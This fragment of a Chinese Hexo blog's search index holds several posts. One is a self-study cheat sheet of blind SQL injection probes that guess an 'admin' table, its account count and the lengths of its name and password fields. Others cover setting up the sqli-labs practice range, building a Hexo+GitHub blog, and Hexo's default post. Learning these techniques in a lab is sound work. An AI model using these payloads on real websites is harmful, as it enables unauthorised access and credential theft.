攻击者可以通过其他步骤获取到服务器的最高权限，并通过后门等方法，对服务器进行控制修改与操作。 ⚪sql注入常用语句▲ 判断是否存在注入点 1; and 1=1 and 1=2 ▲ 猜表 12and 0&lt;&gt;(select count(*) from *) and 0&lt;&gt;(select count(*) from admin) ---判断是否存在admin这张表 ▲ 猜帐号数目（如果遇到0&lt; 返回正确页面 1&lt;返回错误页面说明帐号数目就是1个 ） 12and 0&lt;(select count(*) from admin) and 1&lt;(select count(*) from admin) ▲ 猜解字段名称 （在len( ) 括号里面加上我们想到的字段名称. ） 123and 1=(select count(*) from admin where len(*)&gt;0)-- and 1=(select count(*) from admin where len(用户字段名称name)&gt;0) and 1=(select count(*) from admin where len(_blank&gt;密码字段名称password)&gt;0) ▲ 猜解各个字段的长度 （猜解长度就是把&gt;0变换 直到返回正确页面为止 ） 1234567and 1=(select count(*) from admin where len(*)&gt;0) and 1=(select count(*) from admin where len(name)&gt;6) 错误 and 1=(select count(*) from admin where len(name)&gt;5) 正确 长度是6 and 1=(select count(*) from admin where len(name)=6) 正确and 1=(select count(*) from admin where len(password)&gt;11) 正确 and 1=(select count(*) from admin where len(password)&gt;12) 错误 长度是12 and 1=(select count(*) from admin where len(password)=12) 正确","path":"2020/07/12/sql注入基础回头/","date":"07-12","excerpt":"","tags":[]},{"title":"SQL靶场的建立","text":"🔺SQL靶场搭建▲ 本次自学搭建sql靶场，使用前请自行配置好bitnami软件； ⚪下载安装靶场▲1. 进入页面下载靶场文件：SQLI靶场；▲2. 将靶场文件压缩包解压至bitnami软件目录下的WAMP中apache2的htdocs文件夹内。 ⚪靶场的基础设置与运行▲1. 【解压与设置】解压完毕后，进入 “sqli-labs-master”文件夹内的“sql-connerctions”文件夹，打开其中的“db-creds.inc” 文件进行编辑。在该文件我们可以看到一串代码： 12345678&lt;?php//give your mysql connection username n password$dbuser ='root';$dbpass ='root';$dbname =\"security\";$host = 'localhost';$dbname1 = \"challenges\";?&gt; 选定其中$dbuser =&#39;root&#39;;项，将 root 替换为你所要设置的用户名。选定其中$dbpass =&#39;root&#39;;项，将 root 替换为你所要设置的密码。设置完密码后，保存并关闭；▲2. 【初步运行】在bitnami文件源目录下，打开manager-windows.exe文件，选择Open phpMyAdmin选项，进入页面，输入上一步所设置的用户名和密码，确认后登陆成功即可以关闭页面。▲3. 【开始使用】此时，进入sqli-labs-master文件夹内，选择index.html即可成功进入靶场，开始攻克难关！","path":"2020/03/29/SQL靶场的建立/","date":"03-29","excerpt":"","tags":[]},{"title":"本人的首次搭建hexo+github博客","text":"🔺组件准备步骤⚪node的安装▲进入node官网选择下载长期支持版； ▲下载后自行选择路径并安装。 ⚪注册一个GitHub账号▲进入GitHub官网，按照注册提示进行注册；▲在邮箱验证后，进入网址创建页面；▲在“Repository name”处填入自己的博客网址，格式为用户名.github.io(在用户名处填入自己注册账号时所用的用户名)，GitHub帐号注册步骤基本完成； ⚪git for windows组件的安装▲进入git官网，并在官网首页选择download下载安装包；▲下载安装包后，自行选择安装路径后执行安装，除安装时有两点需要注意外，其他建议都保持默认设置；※注意！安装到该步骤后勾选下方选项：Don’t creat a Start Menu folder；※注意！安装到该步骤后选择第二项Use Windows’ default console window； ▲至此，git安装步骤完成。 🔺设置配置⚪githubSHH的配置▲在git的安装目录处运行git-bash.exe运行界面如下：▲输入各种组件命令后回车安装组件（Github的注册邮箱地址即注册账号时的验证邮箱）；▲连续两次回车跳过设置密匙并形成密匙阵列；▲将命令窗口最小化后进入GitHub官网后进入个人的setting页面更改其他设置；▲按图选择SSH and GPG keys选项，并点击New SSH key；▲Title处填入自己的用户名，Key处填入用记事本方式打开的C:\\Users\\DELL.ssh路径的id_rsa.pub文件内的所有内容；▲至此，SSH配置完成。 ⚪Hexo的配置▲进入Hexo官网，可以发现官网首页的安装命令；▲在想要安装Hexo组件的盘中新建一个名为“blog”的文件夹，并在该blog文件夹内呼出cmd程序，并将事先打开的Hexo官网首页的安装命令复制到cmd运行框内并运行安装；▲安装后再输入hexo init +博客名指令进行初始化；▲初始化完成后，在运行框内输入cd +博客名进入博客，并输入npm install指令，回车安装；▲安装完成后，输入hexo s -p 5555（此处选择555端口），运行结束后就可以在localhost:5555地址看到自己的博客了。 🔺其他组件⚪自行安装sublime并按照博客主题修改设置。🔺至此，博客搭建完成。","path":"2020/02/15/本人的首次搭建hexo+github博客/","date":"02-15","excerpt":"","tags":[]},{"title":"Hello World","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","path":"2020/02/07/hello-world/","date":"02-07","excerpt":"","tags":[]}]}